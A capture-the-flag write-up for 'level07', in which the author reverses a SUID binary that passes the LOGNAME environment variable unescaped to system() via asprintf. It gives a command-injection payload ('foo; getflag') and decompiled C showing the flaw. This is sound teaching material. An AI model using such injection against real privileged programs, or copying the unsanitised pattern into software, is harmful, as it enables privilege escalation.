# foothold

Another level without prior information... But! It doesn't matter, because
there is a binary with SUID bit in the user home. (UuU)

I more or less get what is doing by using `strings`, but, I'm bored, let's
reverse it.

```diff
 /lib/ld-linux.so.2
 zE&9qU
 __gmon_start__
 libc.so.6
 _IO_stdin_used
 setresgid
+asprintf
+getenv
 setresuid
+system
 getegid
 geteuid
 __libc_start_main
 GLIBC_2.0
 PTRh
 UWVS
 [^_]
+LOGNAME
+/bin/echo %s
```

And yeat...
```bash
$ LOGNAME=paco ./level07
paco
```

As I tought, the binary gets the `LOGNAME` env var and prints it

But, how can we exploit this?

Well, `asprintf` is similar to `sprintf` just saves the formated output to a
string, except that it allocated a string large enough to hold the output,
including the terminated null byte, and returns a pointer to it via the first
argument, and it must be freed later.

The prototype is: `int asprintf(char **strp, const char *fmt, va_list ap);`

So, if there's a call to `system`... We can assume that they build the command
string with `asprintf`, and pass it to `system`.

So we could probably do something like:
```bash
LOGNAME="foo; getflag" ./level07
```

And there it is, the flag, this one was really easy, I'm kind of unhappy because
the previous level was tricky.

Just for fun, I also reversed the program, and indeed, is doing what I thought:
```c
int main(int argc,char **argv,char **envp)
{
    char *pcVar1;
    int iVar2;
    char *buffer;
    gid_t gid;
    uid_t uid;
    char *local_1c;
    __gid_t local_18;
    __uid_t local_14;
    
    local_18 = getegid();
    local_14 = geteuid();
    setresgid(local_18,local_18,local_18);
    setresuid(local_14,local_14,local_14);
    local_1c = (char *)0x0;
    pcVar1 = getenv("LOGNAME");
    asprintf(&local_1c,"/bin/echo %s ",pcVar1);
    iVar2 = system(local_1c);
    return iVar2;
}
```
